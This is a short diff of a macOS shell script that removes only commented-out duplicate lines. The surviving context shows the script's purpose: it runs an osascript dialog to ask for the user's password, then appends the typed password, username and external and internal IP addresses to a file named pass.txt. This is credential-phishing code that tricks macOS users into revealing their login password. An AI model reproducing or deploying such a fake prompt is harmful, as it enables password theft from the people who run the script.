@@ -19,13 +19,4 @@ EOF
 dialogText=$(osascript -e "$applescriptCode");
 echo $externalip + $internalip + username=$username  password=$dialogText >>  pass.txt;
 
-#sleep 1
-#dialogText=$(osascript -e "$applescriptCode");
-
-#echo $externalip + $internalip + username=$username  password=$dialogText >>  pass.txt;
-
-#sleep 1
-#dialogText=$(osascript -e "$applescriptCode");
-
-#echo $externalip + $internalip + username=$username  password=$dialogText >>  pass.txt;
 
